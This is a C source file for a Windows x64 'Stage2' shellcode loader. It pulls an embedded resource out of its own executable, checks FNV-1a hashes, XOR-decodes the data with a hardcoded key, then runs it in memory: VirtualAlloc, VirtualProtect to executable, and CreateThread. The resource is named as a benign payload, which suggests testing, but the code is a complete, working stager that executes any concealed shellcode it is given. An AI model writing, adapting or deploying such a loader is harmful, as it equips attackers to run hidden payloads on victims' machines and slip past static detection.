/* Native x64 Stage2: verify, decrypt, and run the supplied VXOR payload. */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>

#include "stage2_resource.h"

#define VXOR_HEADER_SIZE 40
#define VXOR_FNV_OFFSET UINT64_C(1469598103934665603)
#define VXOR_FNV_PRIME UINT64_C(1099511628211)
static const unsigned char VXOR_KEY[] = { 0x5A, 0x1F, 0x3C, 0x7E };

static uint16_t ReadU16Le(const unsigned char* value) {
    return (uint16_t)value[0] | ((uint16_t)value[1] << 8);
}

static uint64_t ReadU64Le(const unsigned char* value) {
    uint64_t result = 0;
    for (unsigned int index = 0; index < 8; ++index) {
        result |= (uint64_t)value[index] << (index * 8);
    }
    return result;
}

static uint64_t UpdateFnv1a(
    uint64_t hash,
    const unsigned char* data,
    size_t size
) {
    for (size_t index = 0; index < size; ++index) {
        hash ^= data[index];
        hash *= VXOR_FNV_PRIME;
    }
    return hash;
}

static void FreeDecoded(unsigned char** buffer, size_t size) {
    if (buffer && *buffer) {
        SecureZeroMemory(*buffer, size);
        free(*buffer);
        *buffer = NULL;
    }
}

static int DecodeEmbeddedVxor(
    const unsigned char* package,
    size_t packageSize,
    unsigned char** decoded,
    size_t* decodedSize
) {
    uint16_t flags = 0;
    uint64_t plainSize = 0;
    uint64_t plainHash = 0;
    uint64_t cipherSize = 0;
    uint64_t cipherHash = 0;
    const unsigned char* cipher = NULL;
    unsigned char* buffer = NULL;

    *decoded = NULL;
    *decodedSize = 0;
    if (!package || packageSize < VXOR_HEADER_SIZE ||
        memcmp(package, "VXOR", 4) != 0 || package[4] != 1) {
        fprintf(stderr, "[-] Embedded VXOR header is invalid.\n");
        return 0;
    }

    flags = ReadU16Le(package + 6);
    plainSize = ReadU64Le(package + 8);
    plainHash = ReadU64Le(package + 16);
    cipherSize = ReadU64Le(package + 24);
    cipherHash = ReadU64Le(package + 32);
    if (package[5] != sizeof(VXOR_KEY) || flags != 0 ||
        plainSize == 0 || plainSize != cipherSize ||
        plainSize > SIZE_MAX ||
        cipherSize > SIZE_MAX - VXOR_HEADER_SIZE ||
        packageSize != VXOR_HEADER_SIZE + (size_t)cipherSize) {
        fprintf(stderr, "[-] Embedded VXOR metadata is invalid.\n");
        return 0;
    }

    cipher = package + VXOR_HEADER_SIZE;
    if (UpdateFnv1a(VXOR_FNV_OFFSET, cipher, (size_t)cipherSize) !=
        cipherHash) {
        fprintf(stderr, "[-] Embedded VXOR cipher hash mismatch.\n");
        return 0;
    }

    buffer = (unsigned char*)malloc((size_t)plainSize);
    if (!buffer) {
        fprintf(stderr, "[-] VXOR decode allocation failed.\n");
        return 0;
    }
    for (size_t index = 0; index < (size_t)plainSize; ++index) {
        buffer[index] = cipher[index] ^ VXOR_KEY[index % sizeof(VXOR_KEY)];
    }
    if (UpdateFnv1a(VXOR_FNV_OFFSET, buffer, (size_t)plainSize) !=
        plainHash) {
        fprintf(stderr, "[-] Embedded VXOR plain hash mismatch.\n");
        FreeDecoded(&buffer, (size_t)plainSize);
        return 0;
    }

    *decoded = buffer;
    *decodedSize = (size_t)plainSize;
    printf("[+] Embedded VXOR decoded and verified (%zu bytes).\n",
        *decodedSize);
    return 1;
}

static int HasArgument(
    int argc,
    wchar_t* argv[],
    const wchar_t* expected
) {
    for (int index = 1; index < argc; ++index) {
        if (wcscmp(argv[index], expected) == 0) {
            return 1;
        }
    }
    return 0;
}

static int RunDecodedPayload(
    unsigned char** decoded,
    size_t decodedSize
) {
    void* executable = NULL;
    DWORD oldProtection = 0;
    HANDLE thread = NULL;
    DWORD waitResult = 0;
    DWORD exitCode = 0;
    int result = 0;

    executable = VirtualAlloc(
        NULL,
        decodedSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    if (!executable) {
        fprintf(stderr, "[-] VirtualAlloc failed: %lu\n", GetLastError());
        return 0;
    }

    CopyMemory(executable, *decoded, decodedSize);
    FreeDecoded(decoded, decodedSize);
    if (!VirtualProtect(
            executable,
            decodedSize,
            PAGE_EXECUTE_READ,
            &oldProtection)) {
        fprintf(stderr, "[-] VirtualProtect failed: %lu\n", GetLastError());
        goto cleanup;
    }
    if (!FlushInstructionCache(
            GetCurrentProcess(),
            executable,
            decodedSize)) {
        fprintf(stderr, "[-] FlushInstructionCache failed: %lu\n",
            GetLastError());
        goto cleanup;
    }

    thread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)executable,
        NULL,
        0,
        NULL);
    if (!thread) {
        fprintf(stderr, "[-] CreateThread failed: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] Decoded payload thread started.\n");
    printf("[i] Interactive Stage2 is waiting for the payload thread.\n");

    waitResult = WaitForSingleObject(thread, INFINITE);
    if (waitResult != WAIT_OBJECT_0 ||
        !GetExitCodeThread(thread, &exitCode)) {
        fprintf(stderr, "[-] Payload startup verification failed: %lu\n",
            GetLastError());
        goto cleanup;
    }

    printf("[i] Payload thread exit code: 0x%08lX (%lu).\n",
        exitCode,
        exitCode);
    if ((exitCode & 0xC0000000UL) == 0xC0000000UL) {
        fprintf(stderr, "[-] Payload thread terminated with an NT failure.\n");
        goto cleanup;
    }
    result = 1;

cleanup:
    if (thread) {
        CloseHandle(thread);
    }
    if (executable) {
        SecureZeroMemory(executable, decodedSize);
        VirtualFree(executable, 0, MEM_RELEASE);
    }
    return result;
}

int wmain(int argc, wchar_t* argv[]) {
    HMODULE module = GetModuleHandleW(NULL);
    HRSRC resource = NULL;
    HGLOBAL loaded = NULL;
    const unsigned char* package = NULL;
    DWORD packageSize = 0;
    unsigned char* decoded = NULL;
    size_t decodedSize = 0;
    int result = 1;

    if (!module) {
        fprintf(stderr, "[-] GetModuleHandleW failed: %lu\n", GetLastError());
        return 1;
    }
    resource = FindResourceW(
        module,
        MAKEINTRESOURCEW(IDR_BENIGN_PAYLOAD),
        MAKEINTRESOURCEW(10));
    if (!resource) {
        fprintf(stderr, "[-] FindResourceW failed: %lu\n", GetLastError());
        return 1;
    }

    packageSize = SizeofResource(module, resource);
    loaded = LoadResource(module, resource);
    package = loaded
        ? (const unsigned char*)LockResource(loaded)
        : NULL;
    if (!package || !DecodeEmbeddedVxor(
            package,
            packageSize,
            &decoded,
            &decodedSize)) {
        return 1;
    }

    if (HasArgument(argc, argv, L"--decode-only")) {
        printf("[+] Stage2 decode-only verification passed.\n");
        result = 0;
        goto cleanup;
    }

    result = RunDecodedPayload(&decoded, decodedSize) ? 0 : 1;

cleanup:
    FreeDecoded(&decoded, decodedSize);
    return result;
}
